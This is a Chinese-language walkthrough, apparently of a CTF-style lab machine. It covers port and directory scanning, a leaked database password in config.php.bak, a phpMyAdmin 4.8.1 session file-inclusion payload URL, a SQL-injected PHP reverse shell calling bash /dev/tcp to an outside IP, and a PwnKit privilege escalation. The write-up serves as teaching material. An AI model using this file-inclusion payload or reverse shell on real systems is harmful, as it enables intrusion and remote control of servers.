

## 扫描

```
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
Aggressive OS guesses: Linux 3.2 - 4.9 (97%)
```

## WEB

```
进行目录爆破

sudo dirsearch -u "http://192.168.207.134/"

[13:56:42] 200 -   20KB - /about.html
[13:56:54] 301 -  238B  - /assets  ->  http://192.168.207.134/assets/
[13:56:54] 200 -    1KB - /assets/
[13:56:58] 403 -  210B  - /cgi-bin/
[13:57:00] 200 -    0B  - /config.php
[13:57:00] 200 -  107B  - /config.php.bak
对目录进行查看，发现了config.php.bak中有疑似数据库连接密码

<?php
$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";
?>

其他没有发现
```
#### 子域名爆破

```
在其他目录中没有发现任何可以利用的路径，查看主页发现了一个可能的域名，将域名加入hosts文件，然后进行子域名扫描

sudo wfuzz -c -H "HOST:FUZZ.votenow.local" -u "http://votenow.local"  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 854,45

得到了子域名datasafe

```


```
继续目录扫描
[15:01:08] Starting:
[15:01:09] 301 -  241B  - /js  ->  http://datasafe.votenow.local/js/
[15:01:10] 200 -  274B  - /.editorconfig
[15:01:11] 200 -   24B  - /.eslintignore
[15:01:11] 200 -    1KB - /.eslintrc.json
[15:01:12] 403 -  213B  - /.ht_wsr.txt
[15:01:12] 403 -  216B  - /.htaccess.bak1
[15:01:12] 403 -  216B  - /.htaccess.orig
[15:01:12] 403 -  218B  - /.htaccess.sample
[15:01:12] 403 -  216B  - /.htaccess.save
[15:01:12] 403 -  217B  - /.htaccess_extra
[15:01:12] 403 -  214B  - /.htaccess_sc
[15:01:12] 403 -  216B  - /.htaccess_orig
[15:01:12] 403 -  214B  - /.htaccessBAK
[15:01:12] 403 -  215B  - /.htaccessOLD2
[15:01:12] 403 -  214B  - /.htaccessOLD
[15:01:12] 403 -  206B  - /.htm
[15:01:12] 403 -  207B  - /.html
[15:01:12] 403 -  213B  - /.httr-oauth
[15:01:12] 403 -  212B  - /.htpasswds
[15:01:12] 403 -  216B  - /.htpasswd_test
[15:01:40] 403 -  210B  - /cgi-bin/
[15:01:41] 200 -   20KB - /ChangeLog
[15:01:43] 200 -    3KB - /composer.json
[15:01:44] 200 -  109KB - /composer.lock
[15:01:45] 200 -    2KB - /CONTRIBUTING.md
[15:01:49] 301 -  242B  - /doc  ->  http://datasafe.votenow.local/doc/
[15:01:49] 403 -  206B  - /doc/
[15:01:52] 301 -  247B  - /examples  ->  http://datasafe.votenow.local/examples/
[15:01:52] 403 -  211B  - /examples/
[15:01:52] 200 -    2KB - /export.php
[15:01:52] 200 -   22KB - /favicon.ico
[15:02:00] 403 -  205B  - /js/
[15:02:01] 200 -   26KB - /js/config.js
[15:02:02] 403 -  212B  - /libraries/
[15:02:02] 301 -  248B  - /libraries  ->  http://datasafe.votenow.local/libraries/
[15:02:03] 200 -   18KB - /LICENSE
[15:02:06] 200 -    2KB - /logout.php
[15:02:13] 200 -  733B  - /package.json
[15:02:18] 200 -    2KB - /phpunit.xml.dist
[15:02:21] 200 -    1KB - /README
[15:02:23] 200 -   26B  - /robots.txt
[15:02:24] 301 -  246B  - /scripts  ->  http://datasafe.votenow.local/scripts/
[15:02:24] 403 -  210B  - /scripts/
[15:02:26] 301 -  244B  - /setup  ->  http://datasafe.votenow.local/setup/
[15:02:26] 200 -    5KB - /setup/
[15:02:29] 301 -  242B  - /sql  ->  http://datasafe.votenow.local/sql/
[15:02:29] 403 -  206B  - /sql/
[15:02:32] 301 -  248B  - /templates  ->  http://datasafe.votenow.local/templates/
[15:02:32] 403 -  212B  - /templates/
[15:02:33] 301 -  243B  - /test  ->  http://datasafe.votenow.local/test/
[15:02:33] 403 -  207B  - /test/
[15:02:33] 301 -  245B  - /themes  ->  http://datasafe.votenow.local/themes/
[15:02:33] 403 -  209B  - /themes/
[15:02:34] 301 -  242B  - /tmp  ->  http://datasafe.votenow.local/tmp/
[15:02:34] 403 -  206B  - /tmp/
[15:02:37] 403 -  209B  - /vendor/
[15:02:37] 200 -    0B  - /vendor/autoload.php
[15:02:37] 200 -    0B  - /vendor/composer/autoload_classmap.php
[15:02:37] 200 -    0B  - /vendor/composer/autoload_files.php
[15:02:37] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[15:02:37] 200 -    0B  - /vendor/composer/ClassLoader.php
[15:02:37] 200 -    1KB - /vendor/composer/LICENSE
[15:02:37] 200 -    0B  - /vendor/composer/autoload_real.php
[15:02:37] 200 -    0B  - /vendor/composer/autoload_psr4.php
[15:02:38] 200 -   35KB - /vendor/composer/installed.json
[15:02:37] 500 -    0B  - /vendor/composer/autoload_static.php
[15:02:45] 200 -   28KB - /yarn.lock

```

#### 文件包含

```
searchsploit phpmyadmin 4.8.1 发现了一个session包含的漏洞。而且在数据库中得到了admin的账号密码，使用john并没有破解成功，换了多个字典依旧不行

经过测试发现了时payload中目录写错了，应该是/var/lib/php/session/而不是/var/lib/php/sessions/

index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_f5bho7uqfpasm1afeg9uns0fhl17ohin

写入反弹shell
select "<?php system('bash -i &>/dev/tcp/172.26.32.20/4444 0>&1 | bash');?>";
```

## 提权

```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper


枚举后发现没有可以利用的，也并没有找到可以利用的文件等信息，而且唯一用户admin的密码，并没有破解成功，只有web权限。尝试内核提权
cve_2021_4034_pwnkit_lpe_pkexec

成功得到shell
```
![[Pasted image 20240130170032.png]]